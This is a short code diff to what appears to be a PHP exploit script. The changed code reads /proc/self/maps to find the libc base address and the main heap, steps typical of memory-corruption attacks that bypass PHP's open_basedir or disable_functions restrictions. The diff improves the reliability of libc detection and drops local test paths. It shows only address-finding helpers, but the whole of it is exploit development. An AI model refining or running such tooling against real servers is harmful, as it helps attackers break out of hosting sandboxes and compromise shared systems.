@@ -297,8 +297,8 @@ function get_libc_path($maps_path) {
     return $libc[0];
 }
 
-function get_libc_base($maps_path) {
-    preg_match('/(\w+)-(\w+).*?libc/', file_get_contents($maps_path), $libcgain);
+function get_libc_base($maps_path, $libc_path) {
+    preg_match('/(\w+)-(\w+).*?' . preg_quote($libc_path, '/') . '/', file_get_contents($maps_path), $libcgain);
     if (empty($libcgain)) {
         echo "[-]can't find Libc base"."<br>\n";
         return null;
@@ -677,12 +677,9 @@ if (check_open_basedir()) {
 }
 
 $maps_path = '/proc/self/maps';
-//$maps_path = './maps';
 $regions = get_regions($maps_path);
-
 $libc_path = get_libc_path($maps_path);
-//$libc_path = './libc-2.27.so';
-$libc_base = get_libc_base($maps_path);
+$libc_base = get_libc_base($maps_path, $libc_path);
 
 $heap = find_main_heap($regions);
 
